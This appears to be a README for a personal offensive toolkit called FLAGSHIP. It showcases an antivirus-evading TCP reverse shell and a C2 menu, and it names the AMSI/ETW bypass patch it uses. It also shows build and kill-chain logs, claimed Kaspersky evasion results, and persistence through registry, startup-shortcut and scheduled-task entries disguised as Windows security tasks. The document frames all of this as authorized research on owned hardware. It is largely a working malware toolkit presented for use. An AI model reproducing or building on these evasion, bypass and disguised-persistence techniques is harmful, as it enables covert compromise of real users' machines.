# FLAGSHIP — Unified Iron-Dome Platform

```
╔══════════════════════════════════════════════════════════════════════════════╗
║    ███████╗██╗      █████╗  ██████╗ ███████╗██╗  ██╗██╗██████╗              ║
║    ██╔════╝██║     ██╔══██╗██╔════╝ ██╔════╝██║  ██║██║██╔══██╗             ║
║    █████╗  ██║     ███████║██║  ███╗███████╗███████║██║██████╔╝             ║
║    ██╔══╝  ██║     ██╔══██║██║   ██║╚════██║██╔══██║██║██╔═══╝              ║
║    ██║     ███████╗██║  ██║╚██████╔╝███████║██║  ██║██║██║                  ║
║    ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚═╝                  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  OPERATOR: rainfantry  ✦  CALLSIGN: RADON  ✦  22DIV VADER UNIT              ║
║  ✡ IDF CYBER SQUAD ✡ IRON-SUN ✡ GHOST ENCODER ✡ CHEYANNE WATCH ✡           ║
║  OWN HARDWARE ONLY  ✦  AUTHORIZED RESEARCH  ✦  OPSEC ACTIVE                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Author:** rainfantry  
**Platform:** RADON (Radon_Laptop1 · GIGABYTE G7 GD · Win11 26200) + gwu07 (LAPTOP-R32M8MLI)  
**Version:** v1.2.0 — 2026-06-26  
**Status:** OPERATIONAL

---

## What Is FLAGSHIP

Unified command launcher combining all research streams:

| Component | Role |
|-----------|------|
| **iron-sun** | TCP reverse shell — 7-layer PE evasion stack, dynamic API, XOR |
| **CHEYANNE** | C2 framework — kill chain menu, multi-shell handler |
| **VADER** | AMSI/ETW bypass — `xor eax,eax; ret` memory patch |
| **Iron-Dome Builder v4.0.0** | Full deployment pipeline — ghost encoder, PS1 stager, tri-vector persist |
| **iron_sun_suite** | 8-phase automated test suite — 105 tests |
| **WATCH-3** | Desktop screenshot monitor — 3-shot mss capture |

---

## ASCII ART — IRON-SUN + IDF CYBER SQUAD (LIVE ON RADON)

All banners render at launch via dynamic ray-drawing engine.

### Iron-Sun Rising Sun + IDF Cyber Squad — Full Stack (RADON 15:45)

Both banners stack at launch: ADF Rising Sun (iron_sun_suite art) above, IDF Cyber Squad (builder v4.0.0 art) below, FLAGSHIP block text beneath.

![Full ASCII stack](screenshots/flagship_full_stack_ascii_154617.png)

### IDF Cyber Squad Banner — Builder ► PHASE: BUILD (RADON 15:42)

`iron_dome_builder.py v4.0.0` converging-ray engine. 17 rays × 180°, gold on IDF blue. `✡ IDF CYBER SQUAD ✡ 22DIV ✡ VADER ✡ ORACLE ✡`

![IDF Cyber Squad banner](screenshots/builder_v4_idf_cybersquad_154336.png)

### Iron-Sun + FLAGSHIP Banner (RADON 15:10)

Dynamic rising-sun art from iron_sun_suite integrated into flagship. Gold rays on IDF blue, "THE IRON-SUN · AUSTRALIAN ARMY · 22DIV".

![Iron-Sun + FLAGSHIP](screenshots/iron_sun_flagship_banner_151042.png)

---

## WATCH-3 — LIVE PROOF (RADON 2026-06-26 15:45)

`W` from the FLAGSHIP menu fires 3 desktop screenshots at 5-second intervals via `mss`.

### WATCH-3 COMPLETE — All 3 Shots Confirmed on Screen

![WATCH-3 complete](screenshots/watch3_complete_mcp_154617.png)

**Output log (visible in screenshot):**
```
[1/3]  watch3_1_154521.png  (322,863 bytes)
[2/3]  watch3_2_154526.png  (328,886 bytes)
[3/3]  watch3_3_154531.png  (278,721 bytes)

[+] WATCH-3 COMPLETE — 3 screenshots saved to screenshots/
FLAGSHIP v1.2.0 — RADON — 2026-06-26 15:45:31
```

### Watch Shot 1 — 15:45:21
![Watch 1](screenshots/watch3_1_154521.png)

### Watch Shot 2 — 15:45:26
![Watch 2](screenshots/watch3_2_154526.png)

### Watch Shot 3 — 15:45:31
![Watch 3](screenshots/watch3_3_154531.png)

---

## IRON-DOME v4.0.0 — Build Proof (RADON 2026-06-26 15:42)

`iron_dome_builder.py v4.0.0` synced from gwu07/Oracle (`260418f`) and run live on RADON.

### Builder Launch — IDF Cyber Squad Ray Art + ► PHASE: BUILD

![Builder v4.0.0 banner](screenshots/builder_v4_banner_full_154222.png)

### BUILD COMPLETE

![Builder v4.0.0 complete](screenshots/builder_v4_build_complete_154222.png)

```
IRON-DOME BUILDER v4.0.0
Target: 127.0.0.1:4443   XOR: 0xFC   Variant: v1
VADER: ACTIVE — AMSI/ETW bypass spliced into payload

[1/4] C source generated — XOR 0xFC applied, VADER injected
[2/4] PE compiled — iron_dome_v1.exe  44,032 bytes
      SHA256: 18B643ADF9267C47CEC5AE198460A2D9D895925166C9F8445625B56319DCAFBF
[3/4] Ghost PS1 stager — zero-width Unicode, invisible to KAV content scan
[4/4] Deployment doc written

BUILD COMPLETE — IRON-DOME v4.0.0
Output: builds/iron_dome/
  iron_dome_v1_stager.ps1
  iron_dome_v1_deploy.md
```

---

## Suite Proof — iron_sun_suite on RADON (2026-06-26 15:11)

### Suite Launch — Iron-Sun Art + gcc Compile OK
gcc 15.2.0 compiled iron_sun.exe (106,857 bytes) with 127.0.0.1 loopback.

![Suite launch + compile](screenshots/suite_banner_compile_151242.png)

### Phase 4 — Live TCP Shell + Phase 5 — 25/25 Recon Commands

TCP 0.0.0.0:4443, ISUN magic gate open, cmd.exe live PID 7124. All 25 recon commands via shell — whoami, ipconfig, netstat, AV products, drives, services.

![Phase 4 shell + Phase 5 recon](screenshots/suite_phase4_shell_recon_151311.png)

### Final Results
```
Results:  59 PASSED   17 FAILED   15 WARN   of 76 tests
Duration: 21.6s
Machine:  Radon_Laptop1
Time:     2026-06-26 15:11:33
```

![Suite results](screenshots/suite_final_results_151327.png)

---

## Evasion Stack (8 Layers)

| Layer | Technique | MITRE | Status |
|-------|-----------|-------|--------|
| 1 | XOR string obfuscation (key rotation 0xFC→0xF0) | T1027 | CONFIRMED |
| 2 | Dynamic API resolution (LoadLibrary+GetProcAddress) | T1055 | CONFIRMED |
| 3 | Anti-sandbox (timing+screen+disk+CPU+uptime) | T1497 | CONFIRMED |
| 4 | PE header stomp (MZ zeroed in memory) | T1562.001 | CONFIRMED |
| 5 | ISUN magic gate (4-byte auth before cmd.exe) | T1095 | CONFIRMED |
| 6 | Jitter (GetTickCount random delay 2-5s) | T1497.003 | CONFIRMED |
| 7 | gcc/MinGW PE structure (no MSVC signature) | T1027.001 | CONFIRMED |
| 8 | VADER: AMSI+ETW memory patch (xor eax,eax;ret) | T1562.001 | `--vader` |

---

## Relay Test Results — RADON ↔ gwu07

| Ver | XOR Key | SHA256 | KAV Active | Result |
|-----|---------|--------|------------|--------|
| v1 | 0xFC | d720a508... | avpui+avp | **EVADED** ✅ |
| v2 | 0xAB | fde73d8c... | avpui+avp | **EVADED** ✅ |
| v3 | 0xDE | a25bfc5a... | avpui+avp | **EVADED** ✅ |

**3/3 EVADED — Kaspersky Premium (real-time + cloud scanner)**

---

## Kill Chain — gwu07 v4.0.0 (2026-06-26)

```
Builder v4.0.0 --target 127.0.0.1 --port 4443 --xor 0xFC --vader:
  iron_dome_v1.exe  140,800 bytes  SHA: 85a50f82...  8-layer stack
  ghost_fud.exe     117,248 bytes  (zero-width PS1 stager)
  TCP callback      127.0.0.1:60554  banner=OK>
  whoami            LAPTOP-R32M8MLI\gwu07
  PERSIST [1/3]     HKCU\Run\WindowsSecurityUpdate  verified + cleaned
  PERSIST [2/3]     Startup LNK (WindowStyle=7 hidden)
  PERSIST [3/3]     schtasks ONLOGON WindowsSecurityMonitor /rl LIMITED

VERDICT: PASS (8/8) — IRON-DOME v4.0.0 KILL CHAIN GREEN
```

---

## Quick Start

```powershell
$env:PATH = "$env:USERPROFILE\scoop\apps\python\current;" + $env:PATH
$env:PATH = "$env:USERPROFILE\scoop\apps\gcc\current\bin;" + $env:PATH
cd "C:\Users\Ghaleb Jomma\flagship"
python flagship.py
```

| Key | Action |
|-----|--------|
| `B` | BUILD — iron-dome deployment package |
| `T` | TEST — full suite (iron_sun_suite.py) |
| `L` | LIVE — loopback shell test |
| `C` | CHEYANNE — C2 menu |
| `D` | DESIGNATE — callsign generator |
| `W` | WATCH — 3-shot screenshot monitor |
| `S` | SITREP — platform status |
| `X` | EXIT |

---

## Files

```
flagship/
├── flagship.py              — unified launcher
├── flagship_watch3.py       — WATCH-3 standalone showcase
├── flagship_demo.py         — non-interactive MCP demo
├── iron_sun.c               — FUD TCP reverse shell source
├── iron_dome_builder.py     — builder v4.0.0 (IDF Cyber Squad banner)
├── iron_sun_suite.py        — 8-phase test suite (105 tests)
├── live_test.py             — loopback shell test
├── vader_menu.py            — CHEYANNE C2 menu
├── designate.py             — callsign generator
├── shell/iron_sun.c         — gcc compile path copy
├── builds/iron_dome/        — builder output
│   ├── iron_dome_v1_stager.ps1
│   └── iron_dome_v1_deploy.md
├── screenshots/             — all proof (16 shots)
└── README.md                — this file
```

---

*Authorized research on personally-owned hardware only. rainfantry — 22DIV.*
